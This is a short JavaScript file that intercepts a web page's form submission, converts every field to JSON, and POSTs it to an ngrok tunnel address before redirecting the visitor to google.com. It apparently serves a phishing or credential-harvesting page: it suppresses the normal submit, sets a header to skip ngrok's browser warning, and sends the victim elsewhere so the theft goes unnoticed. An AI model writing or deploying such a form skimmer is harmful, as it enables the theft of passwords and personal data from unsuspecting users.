const formDataToJson = (data) => {
  const obj = {};
  for (const [key, value] of data) {
    obj[key] = value;
  }
  return JSON.stringify(obj);
};

const sendData = () => {
  const formData = new FormData(document.querySelector("form"));
  const jsonData = formDataToJson(formData);

  fetch("https://epic-tarpon-definitely.ngrok-free.app/recv", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "ngrok-skip-browser-warning": true,
    },
    body: jsonData,
  }).finally(() => {
    location.href = "https://google.com";
  });
};

document.querySelector("form").addEventListener("submit", (e) => {
  e.preventDefault();
  sendData();
});
